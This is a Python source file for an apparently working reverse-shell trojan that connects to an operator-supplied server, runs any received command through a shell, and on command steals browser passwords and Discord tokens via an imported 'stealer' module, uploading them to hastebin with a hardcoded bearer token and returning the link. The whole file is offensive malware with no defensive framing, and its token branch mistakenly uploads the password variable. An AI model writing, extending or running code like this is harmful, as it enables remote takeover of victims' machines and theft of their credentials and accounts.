import socket
import subprocess
import os
import stealer, requests, json, sys

SERVER_IP = sys.argv[1]
SERVER_PORT = int(sys.argv[2])

def reverse_shell():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_IP, SERVER_PORT))

    while True:
        command = client_socket.recv(1024).decode()

        if command.lower() == 'close':
            break

        if command.lower() == 'takepasswords':
            passwords = json.dumps(stealer.steal_passwords_from_browsers())

            response = requests.post("https://hastebin.com/documents", headers ={'Authorization':'Bearer b303e6924cee6af8dc6df850ef00660dd239f42ae7ce2dcd985183af863abb1ddeede538587c204192b0d5663eb02ed36520f1fa3b0f9d6667a2e0005204c44e'},json=passwords)
            if response.status_code == 200:
                client_socket.send( str('https://hastebin.com/share/'+response.json()['key']).encode() )
            else:
                client_socket.send("Error uploading snippet.".encode())

        if command.lower() == 'taketokens':
            tokens = json.dumps(stealer.steal_tokens_from_discords())

            response = requests.post("https://hastebin.com/documents", headers ={'Authorization':'Bearer b303e6924cee6af8dc6df850ef00660dd239f42ae7ce2dcd985183af863abb1ddeede538587c204192b0d5663eb02ed36520f1fa3b0f9d6667a2e0005204c44e'},json=passwords)
            if response.status_code == 200:
                client_socket.send( str('https://hastebin.com/share/'+response.json()['key']).encode() )
            else:
                client_socket.send("Error uploading snippet.".encode())

        if command.startswith('cd '):
            try:
                os.chdir(command.strip('cd '))
                client_socket.send(b"Changed directory")
            except FileNotFoundError as e:
                client_socket.send(f"Error: {e}".encode())
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            client_socket.send(output.stdout + output.stderr)

    client_socket.close()

def main(_):
    try:
        reverse_shell()
    except Exception:
        print(f'Failed to connect to fleur\'s main server. Retrying connection ... ({_})')
        main(_+1)

main(1)
